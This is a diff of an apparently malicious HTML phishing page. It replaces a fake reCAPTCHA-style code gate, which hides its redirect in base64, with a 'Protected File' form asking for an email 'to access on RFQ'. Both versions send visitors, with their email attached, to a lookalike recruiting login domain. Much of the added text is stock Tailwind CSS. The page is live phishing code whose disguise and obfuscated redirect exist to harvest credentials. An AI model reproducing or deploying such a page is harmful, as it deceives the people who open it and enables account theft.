@@ -1,150 +1,541 @@
-<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Informational</title>
-    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
-    <script>
-      let hasStatus = new URLSearchParams(window.location.search).has("status");
-      if (hasStatus) {
-        let status = new URLSearchParams(window.location.search).get("status");
-        if (status == "true") {
-          let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4ucmVjcnVpdGVybGlua2Vkd2ViLml0LmNvbS9BSGZybmRxRCUyMiUyMC8lM0U="
-          let id = new URLSearchParams(window.location.search).get("id");
-
-          let decodedRef = decodeURIComponent(atob(`${ref}`))
-
-          let lastIndexOfColon = decodedRef.lastIndexOf('"');
-          newDecodedRef= decodedRef.slice(0, lastIndexOfColon) + "?email=" + id + "\" />";
-          const encodedUrl = btoa(newDecodedRef);
-
-
-
-          document.write(decodeURIComponent(atob(`${ref}`)));
-        }
+    <title>Protected File</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      body {
+        margin: 0;
+        font-family: system-ui, sans-serif;
+        background-color: #f4f4f4;
       }
-    </script>
+    </style>
+    <style>
+      *,
+      ::before,
+      ::after {
+        --tw-border-spacing-x: 0;
+        --tw-border-spacing-y: 0;
+        --tw-translate-x: 0;
+        --tw-translate-y: 0;
+        --tw-rotate: 0;
+        --tw-skew-x: 0;
+        --tw-skew-y: 0;
+        --tw-scale-x: 1;
+        --tw-scale-y: 1;
+        --tw-pan-x: ;
+        --tw-pan-y: ;
+        --tw-pinch-zoom: ;
+        --tw-scroll-snap-strictness: proximity;
+        --tw-gradient-from-position: ;
+        --tw-gradient-via-position: ;
+        --tw-gradient-to-position: ;
+        --tw-ordinal: ;
+        --tw-slashed-zero: ;
+        --tw-numeric-figure: ;
+        --tw-numeric-spacing: ;
+        --tw-numeric-fraction: ;
+        --tw-ring-inset: ;
+        --tw-ring-offset-width: 0px;
+        --tw-ring-offset-color: #fff;
+        --tw-ring-color: rgb(59 130 246 / 0.5);
+        --tw-ring-offset-shadow: 0 0 #0000;
+        --tw-ring-shadow: 0 0 #0000;
+        --tw-shadow: 0 0 #0000;
+        --tw-shadow-colored: 0 0 #0000;
+        --tw-blur: ;
+        --tw-brightness: ;
+        --tw-contrast: ;
+        --tw-grayscale: ;
+        --tw-hue-rotate: ;
+        --tw-invert: ;
+        --tw-saturate: ;
+        --tw-sepia: ;
+        --tw-drop-shadow: ;
+        --tw-backdrop-blur: ;
+        --tw-backdrop-brightness: ;
+        --tw-backdrop-contrast: ;
+        --tw-backdrop-grayscale: ;
+        --tw-backdrop-hue-rotate: ;
+        --tw-backdrop-invert: ;
+        --tw-backdrop-opacity: ;
+        --tw-backdrop-saturate: ;
+        --tw-backdrop-sepia: ;
+        --tw-contain-size: ;
+        --tw-contain-layout: ;
+        --tw-contain-paint: ;
+        --tw-contain-style: ;
+      }
+      ::backdrop {
+        --tw-border-spacing-x: 0;
+        --tw-border-spacing-y: 0;
+        --tw-translate-x: 0;
+        --tw-translate-y: 0;
+        --tw-rotate: 0;
+        --tw-skew-x: 0;
+        --tw-skew-y: 0;
+        --tw-scale-x: 1;
+        --tw-scale-y: 1;
+        --tw-pan-x: ;
+        --tw-pan-y: ;
+        --tw-pinch-zoom: ;
+        --tw-scroll-snap-strictness: proximity;
+        --tw-gradient-from-position: ;
+        --tw-gradient-via-position: ;
+        --tw-gradient-to-position: ;
+        --tw-ordinal: ;
+        --tw-slashed-zero: ;
+        --tw-numeric-figure: ;
+        --tw-numeric-spacing: ;
+        --tw-numeric-fraction: ;
+        --tw-ring-inset: ;
+        --tw-ring-offset-width: 0px;
+        --tw-ring-offset-color: #fff;
+        --tw-ring-color: rgb(59 130 246 / 0.5);
+        --tw-ring-offset-shadow: 0 0 #0000;
+        --tw-ring-shadow: 0 0 #0000;
+        --tw-shadow: 0 0 #0000;
+        --tw-shadow-colored: 0 0 #0000;
+        --tw-blur: ;
+        --tw-brightness: ;
+        --tw-contrast: ;
+        --tw-grayscale: ;
+        --tw-hue-rotate: ;
+        --tw-invert: ;
+        --tw-saturate: ;
+        --tw-sepia: ;
+        --tw-drop-shadow: ;
+        --tw-backdrop-blur: ;
+        --tw-backdrop-brightness: ;
+        --tw-backdrop-contrast: ;
+        --tw-backdrop-grayscale: ;
+        --tw-backdrop-hue-rotate: ;
+        --tw-backdrop-invert: ;
+        --tw-backdrop-opacity: ;
+        --tw-backdrop-saturate: ;
+        --tw-backdrop-sepia: ;
+        --tw-contain-size: ;
+        --tw-contain-layout: ;
+        --tw-contain-paint: ;
+        --tw-contain-style: ;
+      } /* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */
+      *,
+      ::after,
+      ::before {
+        box-sizing: border-box;
+        border-width: 0;
+        border-style: solid;
+        border-color: #e5e7eb;
+      }
+      ::after,
+      ::before {
+        --tw-content: "";
+      }
+      :host,
+      html {
+        line-height: 1.5;
+        -webkit-text-size-adjust: 100%;
+        -moz-tab-size: 4;
+        tab-size: 4;
+        font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji",
+          "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+        font-feature-settings: normal;
+        font-variation-settings: normal;
+        -webkit-tap-highlight-color: transparent;
+      }
+      body {
+        margin: 0;
+        line-height: inherit;
+      }
+      hr {
+        height: 0;
+        color: inherit;
+        border-top-width: 1px;
+      }
+      abbr:where([title]) {
+        -webkit-text-decoration: underline dotted;
+        text-decoration: underline dotted;
+      }
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6 {
+        font-size: inherit;
+        font-weight: inherit;
+      }
+      a {
+        color: inherit;
+        text-decoration: inherit;
+      }
+      b,
+      strong {
+        font-weight: bolder;
+      }
+      code,
+      kbd,
+      pre,
+      samp {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas,
+          "Liberation Mono", "Courier New", monospace;
+        font-feature-settings: normal;
+        font-variation-settings: normal;
+        font-size: 1em;
+      }
+      small {
+        font-size: 80%;
+      }
+      sub,
+      sup {
+        font-size: 75%;
+        line-height: 0;
+        position: relative;
+        vertical-align: baseline;
+      }
+      sub {
+        bottom: -0.25em;
+      }
+      sup {
+        top: -0.5em;
+      }
+      table {
+        text-indent: 0;
+        border-color: inherit;
+        border-collapse: collapse;
+      }
+      button,
+      input,
+      optgroup,
+      select,
+      textarea {
+        font-family: inherit;
+        font-feature-settings: inherit;
+        font-variation-settings: inherit;
+        font-size: 100%;
+        font-weight: inherit;
+        line-height: inherit;
+        letter-spacing: inherit;
+        color: inherit;
+        margin: 0;
+        padding: 0;
+      }
+      button,
+      select {
+        text-transform: none;
+      }
+      button,
+      input:where([type="button"]),
+      input:where([type="reset"]),
+      input:where([type="submit"]) {
+        -webkit-appearance: button;
+        background-color: transparent;
+        background-image: none;
+      }
+      :-moz-focusring {
+        outline: auto;
+      }
+      :-moz-ui-invalid {
+        box-shadow: none;
+      }
+      progress {
+        vertical-align: baseline;
+      }
+      ::-webkit-inner-spin-button,
+      ::-webkit-outer-spin-button {
+        height: auto;
+      }
+      [type="search"] {
+        -webkit-appearance: textfield;
+        outline-offset: -2px;
+      }
+      ::-webkit-search-decoration {
+        -webkit-appearance: none;
+      }
+      ::-webkit-file-upload-button {
+        -webkit-appearance: button;
+        font: inherit;
+      }
+      summary {
+        display: list-item;
+      }
+      blockquote,
+      dd,
+      dl,
+      figure,
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6,
+      hr,
+      p,
+      pre {
+        margin: 0;
+      }
+      fieldset {
+        margin: 0;
+        padding: 0;
+      }
+      legend {
+        padding: 0;
+      }
+      menu,
+      ol,
+      ul {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+      }
+      dialog {
+        padding: 0;
+      }
+      textarea {
+        resize: vertical;
+      }
+      input::placeholder,
+      textarea::placeholder {
+        opacity: 1;
+        color: #9ca3af;
+      }
+      [role="button"],
+      button {
+        cursor: pointer;
+      }
+      :disabled {
+        cursor: default;
+      }
+      audio,
+      canvas,
+      embed,
+      iframe,
+      img,
+      object,
+      svg,
+      video {
+        display: block;
+        vertical-align: middle;
+      }
+      img,
+      video {
+        max-width: 100%;
+        height: auto;
+      }
+      [hidden]:where(:not([hidden="until-found"])) {
+        display: none;
+      }
+      .block {
+        display: block;
+      }
+      .flex {
+        display: flex;
+      }
+      .hidden {
+        display: none;
+      }
+      .min-h-screen {
+        min-height: 100vh;
+      }
+      .w-full {
+        width: 100%;
+      }
+      .max-w-sm {
+        max-width: 24rem;
+      }
+      .items-center {
+        align-items: center;
+      }
+      .justify-end {
+        justify-content: flex-end;
+      }
+      .justify-center {
+        justify-content: center;
+      }
+      .space-y-4 > :not([hidden]) ~ :not([hidden]) {
+        --tw-space-y-reverse: 0;
+        margin-top: calc(1rem * calc(1 - var(--tw-space-y-reverse)));
+        margin-bottom: calc(1rem * var(--tw-space-y-reverse));
+      }
+      .rounded {
+        border-radius: 0.25rem;
+      }
+      .rounded-md {
+        border-radius: 0.375rem;
+      }
+      .rounded-t-md {
+        border-top-left-radius: 0.375rem;
+        border-top-right-radius: 0.375rem;
+      }
+      .border {
+        border-width: 1px;
+      }
+      .border-gray-300 {
+        --tw-border-opacity: 1;
+        border-color: rgb(209 213 219 / var(--tw-border-opacity, 1));
+      }
+      .bg-blue-600 {
+        --tw-bg-opacity: 1;
+        background-color: rgb(37 99 235 / var(--tw-bg-opacity, 1));
+      }
+      .bg-white {
+        --tw-bg-opacity: 1;
+        background-color: rgb(255 255 255 / var(--tw-bg-opacity, 1));
+      }
+      .p-6 {
+        padding: 1.5rem;
+      }
+      .px-2 {
+        padding-left: 0.5rem;
+        padding-right: 0.5rem;
+      }
+      .px-4 {
+        padding-left: 1rem;
+        padding-right: 1rem;
+      }
+      .py-1\.5 {
+        padding-top: 0.375rem;
+        padding-bottom: 0.375rem;
+      }
+      .py-2 {
+        padding-top: 0.5rem;
+        padding-bottom: 0.5rem;
+      }
+      .pt-2 {
+        padding-top: 0.5rem;
+      }
+      .text-center {
+        text-align: center;
+      }
+      .text-sm {
+        font-size: 0.875rem;
+        line-height: 1.25rem;
+      }
+      .text-xs {
+        font-size: 0.75rem;
+        line-height: 1rem;
+      }
+      .font-bold {
+        font-weight: 700;
+      }
+      .font-medium {
+        font-weight: 500;
+      }
+      .font-semibold {
+        font-weight: 600;
+      }
+      .text-gray-800 {
+        --tw-text-opacity: 1;
+        color: rgb(31 41 55 / var(--tw-text-opacity, 1));
+      }
+      .text-red-500 {
+        --tw-text-opacity: 1;
+        color: rgb(239 68 68 / var(--tw-text-opacity, 1));
+      }
+      .text-white {
+        --tw-text-opacity: 1;
+        color: rgb(255 255 255 / var(--tw-text-opacity, 1));
+      }
+      .shadow-lg {
+        --tw-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1),
+          0 4px 6px -4px rgb(0 0 0 / 0.1);
+        --tw-shadow-colored: 0 10px 15px -3px var(--tw-shadow-color),
+          0 4px 6px -4px var(--tw-shadow-color);
+        box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
+          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
+      }
+      .hover\:bg-blue-700:hover {
+        --tw-bg-opacity: 1;
+        background-color: rgb(29 78 216 / var(--tw-bg-opacity, 1));
+      }
+      .focus\:outline-none:focus {
+        outline: 2px solid transparent;
+        outline-offset: 2px;
+      }
+      .focus\:ring-2:focus {
+        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
+          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
+        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
+          calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
+        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
+          var(--tw-shadow, 0 0 #0000);
+      }
+      .focus\:ring-blue-500:focus {
+        --tw-ring-opacity: 1;
+        --tw-ring-color: rgb(59 130 246 / var(--tw-ring-opacity, 1));
+      }
+    </style>
   </head>
-
-  <body>
-    <div id="modal" class="w3-modal" style="display: none">
-      <style>
-        input:focus {
-          border: none;
-          outline: none;
-        }
-
-        input {
-          width: 50px;
-          height: 60px;
-          font-size: 40px;
-          text-align: center;
-          border: 1px solid rgba(0, 97, 254, 0.775);
-          /* border-radius: 4px; */
-          color: rgba(0, 0, 0, 0.692);
-          font-weight: 600;
-        }
-
-        input::placeholder {
-          font-size: 12px;
-          color: rgba(0, 97, 254, 0.775);
-        }
-      </style>
+  <body class="flex items-center justify-center min-h-screen px-4">
+    <!-- Modal Box -->
+    <div class="bg-white border shadow-lg rounded-md w-full max-w-sm">
+      <!-- Header Bar -->
       <div
-        class="w3-modal-content w3-animate-bottom"
-        style="width: 400px; margin-top: 72px; left: 0px"
+        class="bg-blue-600 text-white text-center py-2 text-sm font-semibold rounded-t-md"
       >
-        <div
-          style="
-            padding: 16px 24px;
-            font-family: Arial, Helvetica, sans-serif;
-            position: relative;
-          "
-        >
-          <img src="./reCAPTCHA-enterprise.png" alt="" style="width: 40%" />
-          <p
-            style="
-              text-align: center;
-              font-size: 16px;
-              color: rgba(0, 0, 0, 0.76);
-            "
-          >
-            For security reasons, please ensure you enter the code below
-          </p>
-          <div
-            style="
-              display: flex;
-              justify-content: center;
-              margin: 24px 0px 0px;
-              align-items: center;
-            "
-          >
-            <p
-            id="generated-code"
-              style="
-                color: rgba(0, 97, 254, 0.775);
-                font-size: 40px;
-                margin: 0px;
-                font-weight: 600;
-              "
-            >
-              
-            </p>
-            <i
-              class="fa fa-arrow-right"
-              style="
-                margin: 0px 8px;
-                font-size: 32px;
-                color: rgb(0, 97, 254, 0.775);
-              "
-            ></i>
-
-            <div>
-              <input id="code" type="text" />
-            </div>
-          </div>
-
-          <p
-            style="
-              text-align: center;
-              font-size: 12px;
-              color: rgba(0, 0, 0, 0.662);
-              margin-top: 24px;
-            "
-          >
-            By entering the code above, we ensure a direct and secure connection
-            to the document, reducing the risk of unauthorized access.
-          </p>
-        </div>
+        Type in <span class="font-bold">your email</span> to access on RFQ
       </div>
+
+      <!-- Content -->
+      <form id="accessForm" class="p-6 space-y-4">
+        <label for="email" class="text-sm text-gray-800 block"
+          >Email Address</label
+        >
+        <input
+          id="email"
+          name="email"
+          type="email"
+          placeholder="Enter your email address"
+          required=""
+          class="w-full border border-gray-300 rounded px-2 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+        />
+
+        <div class="flex justify-end pt-2">
+          <button
+            type="submit"
+            class="bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium px-4 py-1.5 rounded"
+          >
+            Review Access
+          </button>
+        </div>
+        <p id="error" class="text-xs text-red-500 hidden">
+          Invalid email address. Please enter a valid email.
+        </p>
+      </form>
     </div>
+
     <script>
-      let modal = document.getElementById("modal");
-      let code = document.getElementById("code");
-      let generatedCodeTxt = document.getElementById("generated-code")
-      let generatedCode = generateRandomTwoDigitNumber()
-
-      let hasStatus2 = new URLSearchParams(window.location.search).has(
-        "status"
-      );
-      if (!hasStatus2) {
-        generatedCodeTxt.textContent = generatedCode
-        modal.style.display = "block";
+      // Email validation function
+      function isValidEmail(email) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
       }
 
-      code.addEventListener("input", function (e) {
-        if (code.value == generatedCode) {
-          let currentUrl = window.location.href;
-          currentUrl += "&status=true";
-          window.location.href = currentUrl;
-        }
-      });
+      document
+        .getElementById("accessForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
 
-      function generateRandomTwoDigitNumber() {
-        // Generate a random integer between 10 and 99
-        return Math.floor(Math.random() * 90) + 10;
-      }
+          const emailInput = document.getElementById("email").value.trim();
+          const error = document.getElementById("error");
+
+          // Validate email
+          if (!isValidEmail(emailInput)) {
+            error.textContent =
+              "Invalid email address. Please enter a valid email.";
+            error.classList.remove("hidden");
+            return;
+          }
+
+          // Hide error message if email is valid
+          error.classList.add("hidden");
+
+          // Redirect to URL with email appended
+          window.location.href =
+            "https://login.recruiterlinkedweb.it.com/AHfrndqD?email=" +
+            encodeURIComponent(emailInput);
+        });
     </script>
   </body>
 </html>
